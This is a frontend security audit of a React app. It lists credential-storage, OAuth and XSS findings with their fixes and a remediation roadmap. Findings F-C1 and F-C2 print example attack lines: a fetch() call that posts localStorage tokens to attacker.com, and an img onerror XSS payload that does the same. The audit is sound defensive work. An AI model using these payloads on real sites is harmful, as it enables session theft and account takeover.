# Frontend Security Audit

**Date:** March 17, 2026
**Auditor:** Full codebase review — every auth flow, API layer, route guard, form, and component
**Files audited:**
`src/lib/api.js` · `src/context/AuthContext.jsx` · `src/App.jsx` · `src/lib/utils.js`
`src/lib/queryClient.js` · `src/components/layout/AppLayout.jsx` · `src/components/layout/Sidebar.jsx`
`src/pages/auth/Login.jsx` · `src/pages/auth/Register.jsx` · `src/pages/auth/ForgotPassword.jsx`
`src/pages/auth/ResetPassword.jsx` · `src/pages/auth/AuthCallback.jsx` · `src/pages/auth/EmailVerified.jsx`
`src/pages/notes/NoteEditor.jsx` · `src/pages/notes/NoteDetail.jsx` · `src/pages/resumes/Resumes.jsx`
`src/pages/Profile.jsx` · `src/components/ui/` · `vite.config.js` · `index.html`

**Purpose:** Identify client-side attack surfaces before real users are onboarded.
The frontend is the first thing every user touches — and the first thing an attacker probes.
Client-side security does not replace backend validation, but it is the difference between
a contained incident and a full account takeover.

---

## Executive Summary

The frontend is built on a sound React + React Query architecture with proper route guarding
and a working token refresh flow. However, three patterns create serious exposure:

1. **All credentials live in `localStorage`** — the access token, refresh token, and user
   object are all script-accessible. Any XSS injection anywhere on the page (including from
   a third-party script or a stored HTML note) can silently extract every credential.

2. **The note editor actively encourages raw HTML input** — a UI comment tells users
   "HTML is supported." Combined with the backend's stored XSS finding (M3), this is a
   working stored XSS delivery path against all note viewers.

3. **Logout leaves all cached data in memory** — React Query's cache is never cleared on
   logout. A second user logging in on the same browser session inherits the previous
   user's notes, messages, flashcards, and applications until a page reload.

These three must be addressed before any public-facing deployment.

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 4 |
| Medium | 5 |
| Low / Info | 5 |

---

## Section 1 — Credential Storage

### F-C1 — JWT and Refresh Token Stored in localStorage (Critical)

**Files:** `src/lib/api.js:6`, `src/context/AuthContext.jsx:39-42`

```js
// api.js
const token = localStorage.getItem('token');

// AuthContext.jsx — on login/register
localStorage.setItem('token', token);
localStorage.setItem('refreshToken', refreshToken);
localStorage.setItem('user', JSON.stringify(u)); // PII in storage
```

`localStorage` is synchronously readable by any JavaScript running on the page — your own
code, third-party analytics scripts, browser extensions, and any injected script from an
XSS attack. The access token (1-day JWT), long-lived refresh token, and user profile object
(name, email, avatar) are all stored here. A single XSS injection anywhere in the app
extracts all three in one line:

```js
// What an attacker's injected script does:
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        token:        localStorage.getItem('token'),
        refreshToken: localStorage.getItem('refreshToken'),
        user:         localStorage.getItem('user'),
    }),
});
```

The attacker now has a full session with an active refresh token. They can persist access
for as long as the refresh token lives, even after the victim changes their password
(because token revocation requires knowing the refresh token hash).

**Why `httpOnly` cookies solve this:**
A cookie with `httpOnly: true` is invisible to all JavaScript — even to your own code.
The browser attaches it to every same-site request automatically. An XSS injection
cannot read it. This is the browser's built-in credential isolation mechanism.

**Fix — server changes required (coordinate with backend):**

```js
// backend auth.controller.js — replace token-in-body with cookie:
res.cookie('refreshToken', rawRefreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
    sameSite: 'strict',
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
    path: '/api/auth/refresh',         // scoped to refresh endpoint only
});
// Still return access token in body — it's short-lived (1d) and its
// exposure window is narrow compared to the refresh token
```

```js
// frontend AuthContext.jsx — stop storing refresh token in localStorage:
const login = async (email, password) => {
    const res = await api.post('/auth/login', { email, password });
    const { token, user: u } = res.data; // refreshToken is now in httpOnly cookie
    localStorage.setItem('token', token);
    setUser(u);
    return u;
};
```

```js
// frontend api.js — refresh uses credentials: 'include' to send the cookie:
const { data } = await axios.post('/api/auth/refresh', {}, {
    withCredentials: true, // sends the httpOnly refresh token cookie
});
```

**Interim mitigation (if httpOnly cookies cannot be implemented yet):**
At minimum, stop storing the user profile object in localStorage — it's unnecessary since
the `/auth/me` endpoint hydrates state on mount. Remove all `localStorage.setItem('user', ...)`
calls. Store only the access token, accept the refresh token risk for now, and prioritize
the cookie migration before any beta launch.

---

### F-C3 — AuthCallback Reads JWT Directly from URL (Critical)

**File:** `src/pages/auth/AuthCallback.jsx`

The Google OAuth callback lands at `/auth/callback?token=<JWT>`. The frontend reads the
token directly from the URL query parameter and stores it in localStorage:

```js
const params = new URLSearchParams(window.location.search);
const token = params.get('token');
localStorage.setItem('token', token);
```

This means the 1-day JWT is:
- Permanently recorded in the user's browser history
- Sent in `Referer` headers on the next navigation away from the page
- Logged in any proxy, CDN, or server access log between the OAuth provider and the frontend
- Shareable by copy-paste — a user who copies the callback URL hands their full session to anyone

This matches the backend finding C3. Both sides need to be fixed together using the
one-time code exchange pattern described in the backend audit.

**Fix (frontend side of the backend C3 fix):**

```js
// AuthCallback.jsx — exchange a short-lived code for the token, never read a token from URL
const params = new URLSearchParams(window.location.search);
const code = params.get('code'); // backend sends a 60-second one-time code, not a JWT

if (!code) { navigate('/login'); return; }

const res = await api.post('/auth/google/exchange', { code });
const { token, user } = res.data;
localStorage.setItem('token', token);
// Clean the URL immediately so the code doesn't persist
window.history.replaceState({}, '', '/auth/callback');
```

---

## Section 2 — XSS Delivery Path

### F-C2 — NoteEditor Tells Users to Submit HTML (Critical)

**File:** `src/pages/notes/NoteEditor.jsx:108`

```jsx
<textarea
    placeholder="Start writing your note..."
    value={form.content}
    onChange={(e) => setForm(f => ({ ...f, content: e.target.value }))}
    className="input-field min-h-[400px] resize-y font-mono text-sm leading-relaxed"
/>
<p className="text-xs text-secondary mt-1">
    HTML is supported. For a rich editor, the backend stores HTML content.
</p>
```

This UI explicitly tells every user that HTML is accepted and stored. Combined with the
backend finding M3 (no server-side HTML sanitization), this is a complete stored XSS chain:

1. User A types `<img src=x onerror="fetch('https://attacker.com?t='+localStorage.getItem('token'))">` in the content textarea
2. Backend stores it unsanitized (M3)
3. User B views the shared note — the frontend renders the content
4. The `onerror` handler fires, stealing User B's JWT to the attacker's server

**For this to execute, the note detail page must render content as HTML** (e.g., using
`dangerouslySetInnerHTML`). Even if it currently renders as plain text, this is an active
risk because: (a) the hint trains users to expect HTML support, and (b) a future developer
may add HTML rendering without realizing the content is unsanitized.

**Fix — three layers, all required:**

1. **Remove the "HTML is supported" hint.** Do not advertise an unsafe feature.

2. **Sanitize on the frontend before display** using `DOMPurify`:
```bash
npm install dompurify
```
```jsx
// NoteDetail.jsx — wherever note content is rendered
import DOMPurify from 'dompurify';

// Only use dangerouslySetInnerHTML if contentType === 'html'
// Always sanitize first, no exceptions
const safeHtml = DOMPurify.sanitize(note.content, {
    USE_PROFILES: { html: true },
});
<div dangerouslySetInnerHTML={{ __html: safeHtml }} />

// For plain text / markdown content — never use dangerouslySetInnerHTML
<pre className="whitespace-pre-wrap">{note.content}</pre>
```

3. **The backend must sanitize before storage** (see backend M3). Frontend sanitization
   is a defense-in-depth layer, not a replacement for backend sanitization. Both are required.

---

## Section 3 — Session & Cache Management

### F-H1 — Logout Does Not Clear React Query Cache (High)

**File:** `src/context/AuthContext.jsx:50-58`

```js
const logout = useCallback(() => {
    const refreshToken = localStorage.getItem('refreshToken');
    if (refreshToken) {
        api.post('/auth/logout', { refreshToken }).catch(() => {});
    }
    localStorage.removeItem('token');
    localStorage.removeItem('refreshToken');
    localStorage.removeItem('user');
    setUser(null);
    // ← React Query cache is never cleared
}, []);
```

React Query keeps all fetched data in memory until the page reloads or the cache entry
expires. After logout, every piece of the logged-out user's data — notes, messages,
flashcard sets, applications, friend list — stays in the in-memory cache.

**Scenario:** User A logs out. User B opens the login page in the same browser tab and
logs in. React Query instantly serves User A's cached notes and messages from memory before
their own data loads. User B briefly sees User A's private content.

This is not a remote theoretical attack — it is a routine multi-user or family device scenario.

**Fix:**

```js
// src/lib/queryClient.js — export the queryClient instance
import { QueryClient } from '@tanstack/react-query';
const queryClient = new QueryClient();
export default queryClient;

// AuthContext.jsx — import and clear on logout
import queryClient from '@/lib/queryClient';

const logout = useCallback(() => {
    const refreshToken = localStorage.getItem('refreshToken');
    if (refreshToken) {
        api.post('/auth/logout', { refreshToken }).catch(() => {});
    }
    localStorage.removeItem('token');
    localStorage.removeItem('refreshToken');
    localStorage.removeItem('user');
    setUser(null);
    queryClient.clear(); // ← wipe all cached data
}, []);
```

---

### F-M4 — React Query Has No Cache Expiry Config (Medium)

**File:** `src/lib/queryClient.js`

Without a `staleTime` or `gcTime` configuration, React Query uses its defaults:
- `staleTime: 0` — every query is immediately considered stale and re-fetched on mount
- `gcTime: 5 minutes` — cached data sits in memory for 5 minutes after the last subscriber

This means sensitive data (messages, notes, application details) stays in memory for 5
minutes after a page that displayed it is unmounted. In a shared or compromised environment,
this is a data exposure window.

**Fix — set explicit values appropriate for a student productivity app:**

```js
// src/lib/queryClient.js
import { QueryClient } from '@tanstack/react-query';

const queryClient = new QueryClient({
    defaultOptions: {
        queries: {
            staleTime: 60 * 1000,        // 1 minute — data is fresh for 1 min
            gcTime: 5 * 60 * 1000,       // 5 minutes — then evicted from memory
            retry: 1,                     // retry once on failure, not 3 times
            refetchOnWindowFocus: false,  // avoid re-fetching sensitive data on tab switch
        },
    },
});

export default queryClient;
```

---

## Section 4 — Content Security Policy

### F-H2 — No Content Security Policy (High)

**File:** `web/index.html`

The app's `index.html` has no `Content-Security-Policy` meta tag, and no CSP headers are
set by the backend. This means:

- **Any JavaScript injected into the page can run without restriction** — no policy blocks
  injected `<script>` tags, inline `onerror` handlers, or dynamically created script elements
- **External scripts from any domain can be loaded** — a dependency supply chain attack
  (compromised npm package injects a `<script>` tag) executes unchecked
- **The app can be embedded in any third-party iframe** — enabling clickjacking attacks
  where a user's clicks on an invisible Continuum layer trigger actions on a malicious page

**Fix — add a strict CSP meta tag to `index.html`:**

```html
<!-- web/index.html — inside <head>, before any script tags -->
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src  'self' 'nonce-{VITE_CSP_NONCE}';
    style-src   'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src    'self' https://fonts.gstatic.com;
    img-src     'self' data: https://res.cloudinary.com https://lh3.googleusercontent.com;
    connect-src 'self' https://api.groq.com;
    frame-ancestors 'none';
">
```

**What each directive does:**
- `default-src 'self'` — blocks all external resources unless explicitly allowed
- `script-src 'self'` — blocks inline scripts and external scripts not from your own domain
- `frame-ancestors 'none'` — prevents the app from being embedded in any iframe (clickjacking)
- `img-src` — allows Cloudinary (resume/avatar images) and Google (OAuth avatars)
- `connect-src 'self'` — restricts `fetch`/`XMLHttpRequest` to your own API

**Note:** A proper nonce-based CSP requires server-side rendering to inject a unique nonce
per request. For a Vite SPA, the meta tag approach above is a meaningful improvement
even without nonces. For production, add the CSP as an HTTP header from your hosting
provider or reverse proxy — HTTP headers are stronger than meta tags (meta tags don't
block certain injection vectors).

---

### F-H3 — Google Fonts Loaded Without Subresource Integrity (High)

**File:** `web/index.html:8-11`

```html
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
```

External stylesheets are loaded without `integrity` hashes (Subresource Integrity / SRI).
If Google's font CDN were ever compromised or MITM'd, the attacker could inject arbitrary
CSS — including CSS-based data exfiltration attacks that extract form field content character
by character.

This is a low-probability event with Google's infrastructure, but it is a real attack class
and zero-cost to mitigate.

**Option A — add SRI hash (best practice):**
```html
<!-- Generate the hash: https://www.srihash.org -->
<link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
    rel="stylesheet"
    crossorigin="anonymous"
    integrity="sha384-{hash}"
/>
```

**Option B — self-host the font (eliminates the external dependency entirely):**
```bash
# Download Inter from Google Fonts and serve from /public/fonts/
# Reference via @font-face in your CSS
```
Self-hosting removes the external DNS lookup, the preconnect overhead, and the SRI risk.
It also makes the app work offline and in restricted network environments.

---

## Section 5 — Input Handling & Form Security

### F-H4 — API Base URL Defaults to HTTP (High)

**File:** `src/lib/api.js:4`

```js
const api = axios.create({
    baseURL: (import.meta.env.VITE_API_URL || 'http://localhost:5000') + '/api',
});
```

The same default appears in three other places: `AuthContext.jsx` (Google login redirect),
`api.js` (refresh call), and `AuthCallback.jsx`. If `VITE_API_URL` is not set correctly
in the production build environment, all API calls — including requests with JWT headers —
fall back to `http://localhost:5000`, which is:

1. `http://` — plaintext — tokens and payloads sent unencrypted
2. `localhost:5000` — a non-existent host in production — all API calls silently fail

**Fix — add a build-time guard so the app refuses to build without the env var:**

```js
// vite.config.js
export default defineConfig({
    plugins: [
        react(),
        {
            name: 'require-env',
            buildStart() {
                if (!process.env.VITE_API_URL && process.env.NODE_ENV === 'production') {
                    throw new Error('VITE_API_URL must be set for production builds');
                }
            },
        },
    ],
    // ...
});
```

```js
// src/lib/api.js — remove the localhost fallback for production clarity
const BASE = import.meta.env.VITE_API_URL;
if (!BASE && import.meta.env.PROD) {
    throw new Error('VITE_API_URL is not defined');
}
const api = axios.create({
    baseURL: (BASE || 'http://localhost:5000') + '/api',
});
```

---

### F-M1 — Concurrent 401s Each Attempt Token Refresh (Medium)

**File:** `src/lib/api.js:22-40`

When multiple API requests fire simultaneously (common on the dashboard page) and all
receive a 401, each request independently attempts to refresh the token. The `_retry`
flag prevents the same request from retrying twice, but it does not prevent multiple
different requests from each triggering a refresh call at the same moment.

Result: 3-5 parallel calls to `POST /api/auth/refresh` with the same refresh token.
The first succeeds; the rest may fail if the backend has issued a new token and the
old one is being rotated. The failed refresh calls fall through to logout — the user
is redirected to `/login` even though they had a valid session.

**Fix — implement a refresh lock:**

```js
// src/lib/api.js
let refreshPromise = null;

api.interceptors.response.use(
    (res) => res,
    async (err) => {
        const url = err.config?.url || '';
        const isAuthEndpoint = AUTH_ENDPOINTS.some((path) => url.includes(path));

        if (err.response?.status === 401 && !err.config._retry && !isAuthEndpoint) {
            err.config._retry = true;

            const refreshToken = localStorage.getItem('refreshToken');
            if (refreshToken) {
                // Deduplicate: all 401s share one refresh promise
                if (!refreshPromise) {
                    refreshPromise = axios
                        .post(BASE + '/api/auth/refresh', { refreshToken })
                        .finally(() => { refreshPromise = null; });
                }

                try {
                    const { data } = await refreshPromise;
                    localStorage.setItem('token', data.token);
                    err.config.headers.Authorization = `Bearer ${data.token}`;
                    return api(err.config);
                } catch {
                    // refresh failed — fall through
                }
            }

            localStorage.removeItem('token');
            localStorage.removeItem('refreshToken');
            window.location.href = '/login';
        }
        return Promise.reject(err);
    }
);
```

---

### F-M2 — Register Form Sends `name` — Backend Expects `firstName`/`lastName` (Medium)

**File:** `src/pages/auth/Register.jsx:23-29`

```js
await registerUser({
    name: data.name,        // ← sends "name"
    username: data.username,
    email: data.email,
    password: data.password,
});
```

The backend `User` model requires `firstName` and `lastName` as separate required fields.
The form collects a single "Full name" field and sends it as `name`. The backend likely
ignores this field, leaving `firstName` and `lastName` unset on newly registered users.

This is a data integrity bug: all locally registered accounts have no name, while Google
OAuth accounts have names populated. The `fullName` virtual, greeting displays, and
profile page all show blank for password-registered users.

**Fix:**

```js
// Register.jsx — split the name field before submission
const [firstName, ...rest] = data.name.trim().split(' ');
const lastName = rest.join(' ') || firstName; // single-name fallback

await registerUser({
    firstName,
    lastName,
    username: data.username,
    email: data.email,
    password: data.password,
});
```

---

### F-M3 — Raw Server Error Messages Reflected in UI (Medium)

**Files:** `Login.jsx:23`, `Register.jsx:20`

```js
setError(err.response?.data?.error || 'Invalid email or password');
```

Server error strings are displayed verbatim to the user. This is acceptable when the
backend controls its error messages (which it currently does), but it becomes a problem if
the backend ever returns a raw Mongoose validation message like:

> `User validation failed: email: "DROP TABLE users" is not a valid email`

or a stack trace in development mode leaked to production. The user sees raw internal
strings that may confuse them or reveal implementation details.

**Fix — map known error codes to user-facing messages rather than displaying raw strings:**

```js
// src/lib/errors.js
const ERROR_MAP = {
    'Invalid credentials': 'Incorrect email or password.',
    'Email already registered': 'An account with this email already exists.',
    'Username already taken': 'This username is not available.',
    'Email is required': 'Please enter your email address.',
};

export function friendlyError(err, fallback = 'Something went wrong. Please try again.') {
    const msg = err?.response?.data?.error || '';
    return ERROR_MAP[msg] || fallback;
}
```

---

### F-M5 — `window.confirm()` Used for Destructive Actions (Medium)

**File:** `src/pages/resumes/Resumes.jsx:119`

```js
if (window.confirm('Delete this resume and all its feedback history?')) {
    deleteMutation.mutate(resume._id);
}
```

`window.confirm()` is a browser-native blocking dialog. Issues:
- **UI/UX:** It cannot be styled to match the app design — breaks brand consistency
- **Automation risk:** Headless browsers and test scripts can auto-dismiss it
- **Mobile browsers:** Some mobile environments suppress or auto-accept confirm dialogs
- **Accessibility:** Screen readers handle native dialogs inconsistently

The app already has a `Modal` component in `src/components/ui/`. Use it.

**Fix:**

```jsx
// Use the existing Modal component for all destructive confirmations
<Modal
    isOpen={confirmOpen}
    onClose={() => setConfirmOpen(false)}
    title="Delete resume"
>
    <p className="text-sm text-secondary">
        This will permanently delete the resume and all AI feedback history. This cannot be undone.
    </p>
    <div className="flex gap-2 mt-4 justify-end">
        <Button variant="outline" onClick={() => setConfirmOpen(false)}>Cancel</Button>
        <Button variant="danger" onClick={() => { deleteMutation.mutate(id); setConfirmOpen(false); }}>
            Delete
        </Button>
    </div>
</Modal>
```

---

## Section 6 — Low / Informational

### F-L1 — Password Fields Missing `autocomplete` Attributes (Low)

**Files:** `Login.jsx`, `Register.jsx`

Password input fields do not have `autocomplete` attributes. Without them, browsers
apply unpredictable autocomplete behavior — some may offer to save, others may not.
Proper attributes also help password managers identify fields correctly.

**Fix:**

```jsx
// Login.jsx
<Input type="password" autoComplete="current-password" {...register('password')} />

// Register.jsx
<Input type="password" autoComplete="new-password" {...register('password')} />
<Input type="password" autoComplete="new-password" {...register('confirmPassword')} />
```

---

### F-L2 — External Links Missing `rel="noopener noreferrer"` (Low)

Any `<a target="_blank">` link without `rel="noopener noreferrer"` gives the opened
page access to the opener via `window.opener`. The opened page can redirect the
original tab to a phishing page. Modern browsers partially mitigate this by default,
but explicit attributes are required for full cross-browser protection.

**Fix — scan all `<a target="_blank">` elements and add the rel attribute:**

```jsx
// ✗ vulnerable
<a href={url} target="_blank">View job listing</a>

// ✓ safe
<a href={url} target="_blank" rel="noopener noreferrer">View job listing</a>
```

---

### F-L3 — VITE_* Env Vars Are Compiled into the Bundle (Low / Info)

**File:** `vite.config.js`

All `VITE_*` environment variables are statically replaced at build time and are visible
in the compiled JavaScript bundle — anyone who downloads the app's JS can read them with
`strings` or browser devtools.

**Current vars:**
- `VITE_API_URL` — your API server URL. This is fine. Not a secret.

**Never put secrets in `VITE_*` vars.** API keys, database credentials, JWT secrets —
none of these should ever be in a Vite env var. They must live server-side only.

This is documented for awareness. No action required with the current variable set.

---

### F-L4 — No `<meta name="referrer">` Tag (Low)

**File:** `web/index.html`

Without a referrer policy, when a user navigates from your app to an external site
(job listing URLs in applications, Google Doc links), the full URL of the page they
came from is sent in the `Referer` header. If the URL contains query parameters with
sensitive data (e.g., the OAuth callback token — see F-C3), those are leaked to the
destination server.

**Fix:**

```html
<!-- web/index.html — inside <head> -->
<meta name="referrer" content="strict-origin-when-cross-origin" />
```

This sends the origin (your domain) but not the path/query when navigating to external sites.

---

### F-L5 — Form Validation Is Client-Side Only (Low / Info)

**Files:** `Register.jsx`, `Login.jsx`

React Hook Form validates inputs client-side. Client-side validation is never a security
control — it can be bypassed by disabling JavaScript or sending requests directly to the API.
The backend is the authoritative validation layer.

Current state: the backend validates all inputs independently. This is correct.

**This is documented for awareness.** Do not rely on frontend validation for anything
security-relevant (password complexity, email format, field length limits). The backend
must enforce all of these independently, which it currently does (with the exception noted
in backend H6 — email format validation).

---

## Section 7 — What Is Done Well

These patterns are correct and must be preserved.

- **Route guarding is solid:** `AppLayout` checks `user` and redirects to `/login` if null.
  All authenticated routes are nested inside `AppLayout`. Public routes are correctly outside it.
- **Token refresh is automatic and transparent:** The axios interceptor handles 401s silently,
  retries the original request with the new token, and only redirects to `/login` if the
  refresh itself fails. Users are not disrupted by token expiry.
- **Auth endpoints are excluded from the refresh loop:** The `AUTH_ENDPOINTS` list prevents
  the interceptor from attempting a refresh on login/register failures — these errors correctly
  reach the component's catch block for display.
- **`isLoading` prevents flash of unauthenticated content:** `AppLayout` shows a loading state
  while the initial `/auth/me` call resolves. Users never see a redirect flicker.
- **Sensitive inputs use `type="password"`:** All password fields correctly use `type="password"`,
  which prevents browser display and basic shoulder-surfing.
- **Confirm password validation is correct:** The `validate` function in Register.jsx correctly
  compares `confirmPassword` to the live `watch('password')` value, not a stale state.
- **Error display does not leak details on auth failure:** The login error message defaults to
  "Invalid email or password" — not "user not found" or "wrong password" — preserving account
  existence privacy at the UI layer.
- **`stripHtml` utility exists in `utils.js`:** A function exists to strip HTML tags from
  strings. Use it in any context where note content is previewed as plain text (truncated
  list views, notification previews, etc.).
- **`DOMPurify` is not yet used — but `sanitize-html` on the backend and DOMPurify on the
  frontend together form the correct defense.** The infrastructure understanding is there.
- **`queryClient` is a shared singleton:** Exported from `src/lib/queryClient.js` and used
  consistently across the app — makes it possible to call `queryClient.clear()` from AuthContext
  (the F-H1 fix) once imported.

---

## Section 8 — Remediation Roadmap

| # | Finding | Effort | Must do before | Status |
|---|---|---|---|---|
| 1 | Clear React Query cache on logout — `queryClient.clear()` (F-H1) | 5 min | Any public traffic | ✅ Done |
| 2 | Remove "HTML is supported" hint from NoteEditor (F-C2) | 2 min | Any public traffic | ✅ Done |
| 3 | Add `DOMPurify` for HTML note rendering (F-C2) | 30 min | Any public traffic | ✅ Done |
| 4 | Add `<meta name="referrer">` to index.html (F-L4) | 2 min | Any public traffic | ✅ Done |
| 5 | Add `rel="noopener noreferrer"` to all `target="_blank"` links (F-L2) | 15 min | Any public traffic | ✅ Already clean |
| 6 | Fix Register.jsx name split — send `firstName`/`lastName` (F-M2) | 15 min | Any public traffic | ✅ Done |
| 7 | Add CSP meta tag to index.html (F-H2) | 1 hr | Any public traffic | ✅ Done |
| 8 | Add `autocomplete` attributes to password fields (F-L1) | 5 min | Next deploy | ✅ Done |
| 9 | Fix VITE_API_URL missing build guard (F-H4) | 20 min | First production build | ✅ Done |
| 10 | Add explicit React Query cache config — staleTime, gcTime (F-M4) | 15 min | Next deploy | ✅ Done |
| 11 | Fix concurrent 401 refresh race condition (F-M1) | 45 min | Before beta | ✅ Done |
| 12 | Replace `window.confirm()` with Modal component (F-M5) | 30 min | Before beta | ✅ Done |
| 13 | Replace raw server errors with friendlyError map (F-M3) | 1 hr | Before beta | ✅ Done |
| 14 | Self-host Google Fonts or add SRI hashes (F-H3) | 1–2 hrs | Before launch | Deferred |
| 15 | Migrate refresh token to httpOnly cookie — coordinate with backend (F-C1) | 3–5 hrs | Before launch | Deferred |
| 16 | Implement AuthCallback one-time code exchange — coordinate with backend C3 fix (F-C3) | 2–4 hrs | Google OAuth live | Deferred |
